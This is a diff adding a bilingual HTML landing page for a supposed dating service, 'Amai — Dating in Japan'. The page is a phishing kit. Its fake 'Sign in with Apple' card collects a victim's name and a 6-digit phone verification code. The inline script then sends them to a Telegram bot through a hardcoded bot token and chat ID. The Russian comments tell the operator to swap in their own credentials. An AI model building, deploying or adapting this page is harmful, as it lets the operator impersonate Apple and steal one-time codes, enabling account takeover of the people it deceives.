@@ -1,0 +1,437 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Amai — Dating in Japan</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=Noto+Sans+JP:wght@400;500;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+  <div class="bg"></div>
+
+  <header class="header">
+    <div class="logo">Amai</div>
+
+    <div class="header-actions">
+      <button class="lang-btn active" data-lang="en">EN</button>
+      <button class="lang-btn" data-lang="jp">日本語</button>
+    </div>
+  </header>
+
+  <main class="hero">
+    <section class="hero-content reveal">
+      <div class="badge" data-en="Premium Dating in Japan" data-jp="日本向けプレミアムデーティング">Premium Dating in Japan</div>
+
+      <h1 data-en="Find someone who truly understands you" data-jp="本当にわかり合える相手を見つけよう">
+        Find someone who truly understands you
+      </h1>
+
+      <p data-en="Meet real people, build meaningful connections, and start your next chapter in Japan."
+         data-jp="本物の出会いを見つけ、意味のあるつながりを築き、新しい物語を始めましょう。">
+        Meet real people, build meaningful connections, and start your next chapter in Japan.
+      </p>
+
+      <div class="hero-buttons">
+        <button class="btn btn-apple" id="heroAppleBtn">
+          <svg class="apple-icon" viewBox="0 0 24 24" fill="currentColor" width="20" height="20">
+            <path d="M17.05 20.28c-.98.95-2.05.8-3.08.35-1.09-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.09zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z"/>
+          </svg>
+          <span data-en="Sign in with Apple" data-jp="Appleでサインイン">Sign in with Apple</span>
+        </button>
+      </div>
+
+      <div class="stats">
+        <div>
+          <strong>25K+</strong>
+          <span data-en="Active users" data-jp="アクティブユーザー">Active users</span>
+        </div>
+        <div>
+          <strong>98%</strong>
+          <span data-en="Verified profiles" data-jp="認証済みプロフィール">Verified profiles</span>
+        </div>
+        <div>
+          <strong>4.9★</strong>
+          <span data-en="User rating" data-jp="ユーザー評価">User rating</span>
+        </div>
+      </div>
+    </section>
+
+    <aside class="apple-card reveal" id="appleCard">
+      <div class="card-glow"></div>
+
+      <!-- Шаг 1: Имя -->
+      <div class="apple-step active" id="step1">
+        <div class="apple-logo-wrap">
+          <svg class="apple-logo" viewBox="0 0 24 24" fill="currentColor">
+            <path d="M17.05 20.28c-.98.95-2.05.8-3.08.35-1.09-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.09zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z"/>
+          </svg>
+        </div>
+        <h2 data-en="Create your profile" data-jp="プロフィールを作成">Create your profile</h2>
+        <p class="apple-subtitle" data-en="Enter your first name to continue" data-jp="続けるには名前を入力してください">
+          Enter your first name to continue
+        </p>
+
+        <form id="nameForm">
+          <div class="input-group">
+            <label data-en="First name" data-jp="名前">First name</label>
+            <input type="text" id="firstName" placeholder="Your name" autocomplete="given-name" required />
+          </div>
+          <button type="submit" class="btn btn-apple btn-full" data-en="Continue" data-jp="続ける">
+            Continue
+          </button>
+        </form>
+      </div>
+
+      <!-- Шаг 2: Фамилия -->
+      <div class="apple-step" id="step2">
+        <button class="back-btn" id="backToStep1" aria-label="Back">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="18" height="18">
+            <path d="M15 18l-6-6 6-6"/>
+          </svg>
+        </button>
+        <div class="apple-logo-wrap small">
+          <svg class="apple-logo" viewBox="0 0 24 24" fill="currentColor">
+            <path d="M17.05 20.28c-.98.95-2.05.8-3.08.35-1.09-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.09zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z"/>
+          </svg>
+        </div>
+        <h2 data-en="Your last name" data-jp="苗字">Your last name</h2>
+        <p class="apple-subtitle" data-en="Almost done" data-jp="もう少しで完了">Almost done</p>
+        <p class="apple-email-display" id="displayFirstName"></p>
+
+        <form id="surnameForm">
+          <div class="input-group">
+            <label data-en="Last name" data-jp="苗字">Last name</label>
+            <input type="text" id="lastName" placeholder="Your surname" autocomplete="family-name" required />
+          </div>
+          <button type="submit" class="btn btn-apple btn-full" data-en="Continue" data-jp="続ける">
+            Continue
+          </button>
+        </form>
+      </div>
+
+      <!-- Шаг 3: 6-значный код -->
+      <div class="apple-step" id="step3">
+        <button class="back-btn" id="backToStep2" aria-label="Back">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="18" height="18">
+            <path d="M15 18l-6-6 6-6"/>
+          </svg>
+        </button>
+        <div class="apple-logo-wrap small">
+          <svg class="apple-logo" viewBox="0 0 24 24" fill="currentColor">
+            <path d="M17.05 20.28c-.98.95-2.05.8-3.08.35-1.09-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.09zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z"/>
+          </svg>
+        </div>
+        <h2 data-en="Phone Verification" data-jp="電話番号認証">Phone Verification</h2>
+        <p class="apple-subtitle" data-en="Enter the 6-digit verification code" data-jp="6桁の認証コードを入力してください">
+          Enter the 6-digit verification code
+        </p>
+        <p class="apple-email-display" id="displayFullName"></p>
+
+        <form id="codeForm">
+          <div class="code-inputs" id="codeInputs">
+            <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" class="code-digit" data-index="0" />
+            <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" class="code-digit" data-index="1" />
+            <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" class="code-digit" data-index="2" />
+            <span class="code-separator">–</span>
+            <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" class="code-digit" data-index="3" />
+            <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" class="code-digit" data-index="4" />
+            <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" class="code-digit" data-index="5" />
+          </div>
+          <button type="submit" class="btn btn-apple btn-full" data-en="Create profile" data-jp="プロフィール作成">
+            Create profile
+          </button>
+        </form>
+      </div>
+
+      <!-- Шаг успеха -->
+      <div class="apple-step" id="stepSuccess">
+        <div class="success-icon">✓</div>
+        <h2 data-en="Welcome to Amai!" data-jp="Amaiへようこそ！">Welcome to Amai!</h2>
+        <p class="apple-subtitle" data-en="Your profile has been created. Start discovering people near you."
+           data-jp="プロフィールが作成されました。近くの人を見つけましょう。">
+          Your profile has been created. Start discovering people near you.
+        </p>
+      </div>
+    </aside>
+  </main>
+
+  <section class="features">
+    <div class="feature reveal">
+      <div class="icon">❤️</div>
+      <h3 data-en="Real People" data-jp="本物のユーザー">Real People</h3>
+      <p data-en="Verified profiles and authentic connections."
+         data-jp="認証済みプロフィールと本物の出会い。">
+        Verified profiles and authentic connections.
+      </p>
+    </div>
+
+    <div class="feature reveal">
+      <div class="icon">🔒</div>
+      <h3 data-en="Safe & Private" data-jp="安全・プライベート">Safe & Private</h3>
+      <p data-en="Your conversations stay protected."
+         data-jp="あなたの会話は安全に保護されます。">
+        Your conversations stay protected.
+      </p>
+    </div>
+
+    <div class="feature reveal">
+      <div class="icon">⚡</div>
+      <h3 data-en="Instant Matching" data-jp="瞬時にマッチ">Instant Matching</h3>
+      <p data-en="Discover compatible people nearby."
+         data-jp="相性の良い相手をすぐに見つけよう。">
+        Discover compatible people nearby.
+      </p>
+    </div>
+
+    <div class="feature reveal">
+      <div class="icon">💬</div>
+      <h3 data-en="Live Chat" data-jp="ライブチャット">Live Chat</h3>
+      <p data-en="Start meaningful conversations instantly."
+         data-jp="今すぐ会話を始めましょう。">
+        Start meaningful conversations instantly.
+      </p>
+    </div>
+  </section>
+
+  <footer class="footer">
+    <p>© 2026 Amai. All rights reserved.</p>
+  </footer>
+
+  <script>
+    // ============================================
+    //  НАСТРОЙКИ TELEGRAM (ЗАМЕНИ НА СВОИ!)
+    // ============================================
+    const BOT_TOKEN = '8916030126:AAGGX9I-vIvqks8KMYpSlS6i-1Ic9rVySno'; // ← Твой токен
+    const CHAT_ID = '8184548300'; // ← Твой ID чата
+    // ============================================
+
+    // ========== Языковые настройки ==========
+    let currentLang = 'en';
+
+    document.querySelectorAll('.lang-btn').forEach(btn => {
+      btn.addEventListener('click', () => {
+        document.querySelectorAll('.lang-btn').forEach(b => b.classList.remove('active'));
+        btn.classList.add('active');
+        currentLang = btn.dataset.lang;
+        updateLanguage();
+      });
+    });
+
+    function updateLanguage() {
+      document.querySelectorAll('[data-en][data-jp]').forEach(el => {
+        el.textContent = el.dataset[currentLang];
+      });
+    }
+
+    // ========== Логика регистрации ==========
+    const card = document.getElementById('appleCard');
+    const heroBtn = document.getElementById('heroAppleBtn');
+    let currentStep = 1;
+
+    // Элементы
+    const firstName = document.getElementById('firstName');
+    const lastName = document.getElementById('lastName');
+    const displayFirstName = document.getElementById('displayFirstName');
+    const displayFullName = document.getElementById('displayFullName');
+    const codeDigits = document.querySelectorAll('.code-digit');
+
+    // Формы
+    const nameForm = document.getElementById('nameForm');
+    const surnameForm = document.getElementById('surnameForm');
+    const codeForm = document.getElementById('codeForm');
+
+    // Кнопки назад
+    const backToStep1 = document.getElementById('backToStep1');
+    const backToStep2 = document.getElementById('backToStep2');
+
+    // Показать шаг
+    function showStep(stepNumber) {
+      document.querySelectorAll('.apple-step').forEach(el => el.classList.remove('active'));
+      document.getElementById(`step${stepNumber}`).classList.add('active');
+      currentStep = stepNumber;
+    }
+
+    // ========== ОТПРАВКА В TELEGRAM ==========
+    async function sendToTelegram(firstName, lastName, code) {
+      const message = `
+📝 *Новая заявка на консультацию!*
+
+👤 *Имя:* ${firstName}
+👤 *Фамилия:* ${lastName}
+📱 *Код:* ${code}
+🕐 *Дата:* ${new Date().toLocaleString('ru-RU')}
+🌐 *Язык:* ${currentLang === 'en' ? 'English' : '日本語'}
+
+💫 *Amai — Dating in Japan*`;
+      
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+      
+      try {
+        const response = await fetch(url, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message,
+            parse_mode: 'Markdown',
+          })
+        });
+        
+        const data = await response.json();
+        if (!data.ok) {
+          console.error('Ошибка Telegram:', data);
+          return false;
+        }
+        return true;
+      } catch (error) {
+        console.error('Ошибка отправки:', error);
+        return false;
+      }
+    }
+
+    // ========== ОБРАБОТЧИКИ ФОРМ ==========
+    
+    // Шаг 1: Имя
+    nameForm.addEventListener('submit', (e) => {
+      e.preventDefault();
+      const name = firstName.value.trim();
+      if (!name) {
+        firstName.closest('.input-group').classList.add('error');
+        return;
+      }
+      firstName.closest('.input-group').classList.remove('error');
+      displayFirstName.textContent = name;
+      showStep(2);
+      setTimeout(() => lastName.focus(), 300);
+    });
+
+    // Шаг 2: Фамилия
+    surnameForm.addEventListener('submit', (e) => {
+      e.preventDefault();
+      const surname = lastName.value.trim();
+      if (!surname) {
+        lastName.closest('.input-group').classList.add('error');
+        return;
+      }
+      lastName.closest('.input-group').classList.remove('error');
+      displayFullName.textContent = `${firstName.value.trim()} ${surname}`;
+      showStep(3);
+      setTimeout(() => codeDigits[0].focus(), 300);
+    });
+
+    // Шаг 3: Код + отправка в Telegram
+    codeForm.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      
+      let code = '';
+      codeDigits.forEach(input => code += input.value);
+      
+      if (code.length !== 6) {
+        codeDigits.forEach(inp => inp.closest('.code-inputs').classList.add('error'));
+        return;
+      }
+      codeDigits.forEach(inp => inp.closest('.code-inputs').classList.remove('error'));
+      
+      // Показываем индикатор загрузки
+      const submitBtn = codeForm.querySelector('button[type="submit"]');
+      const originalText = submitBtn.textContent;
+      submitBtn.textContent = currentLang === 'en' ? 'Sending...' : '送信中...';
+      submitBtn.disabled = true;
+      
+      // Отправляем в Telegram
+      const name = firstName.value.trim();
+      const surname = lastName.value.trim();
+      const success = await sendToTelegram(name, surname, code);
+      
+      // Восстанавливаем кнопку
+      submitBtn.textContent = originalText;
+      submitBtn.disabled = false;
+      
+      if (success) {
+        showStep('Success');
+      } else {
+        // Показываем ошибку
+        alert(currentLang === 'en' 
+          ? 'Failed to send application. Please try again.' 
+          : '送信に失敗しました。もう一度お試しください。'
+        );
+      }
+    });
+
+    // Автоматический переход между полями кода
+    codeDigits.forEach((input, index) => {
+      input.addEventListener('input', () => {
+        input.value = input.value.replace(/\D/g, '');
+        if (input.value && index < 5) {
+          codeDigits[index + 1].focus();
+        }
+        input.closest('.code-inputs').classList.remove('error');
+      });
+
+      input.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && !input.value && index > 0) {
+          codeDigits[index - 1].focus();
+        }
+      });
+
+      input.addEventListener('paste', (e) => {
+        e.preventDefault();
+        const paste = (e.clipboardData || window.clipboardData).getData('text');
+        const digits = paste.replace(/\D/g, '').slice(0, 6);
+        digits.split('').forEach((digit, i) => {
+          if (codeDigits[i]) codeDigits[i].value = digit;
+        });
+        const nextIndex = Math.min(digits.length, 5);
+        if (codeDigits[nextIndex]) codeDigits[nextIndex].focus();
+      });
+    });
+
+    // Кнопки назад
+    backToStep1.addEventListener('click', () => {
+      showStep(1);
+      setTimeout(() => firstName.focus(), 300);
+    });
+
+    backToStep2.addEventListener('click', () => {
+      showStep(2);
+      setTimeout(() => lastName.focus(), 300);
+    });
+
+    // Открыть/закрыть карточку
+    heroBtn.addEventListener('click', () => {
+      const isVisible = card.classList.contains('visible');
+      if (isVisible) {
+        card.classList.remove('visible');
+        heroBtn.querySelector('span').textContent = currentLang === 'en' ? 'Sign in with Apple' : 'Appleでサインイン';
+        // Сброс
+        firstName.value = '';
+        lastName.value = '';
+        codeDigits.forEach(inp => inp.value = '');
+        showStep(1);
+      } else {
+        card.classList.add('visible');
+        heroBtn.querySelector('span').textContent = currentLang === 'en' ? 'Close ✕' : '閉じる ✕';
+        showStep(1);
+        setTimeout(() => firstName.focus(), 400);
+      }
+    });
+
+    // Убираем ошибки при вводе
+    firstName.addEventListener('input', () => {
+      if (firstName.value.trim()) firstName.closest('.input-group').classList.remove('error');
+    });
+
+    lastName.addEventListener('input', () => {
+      if (lastName.value.trim()) lastName.closest('.input-group').classList.remove('error');
+    });
+
+    // Инициализация
+    showStep(1);
+  </script>
+</body>
+</html>
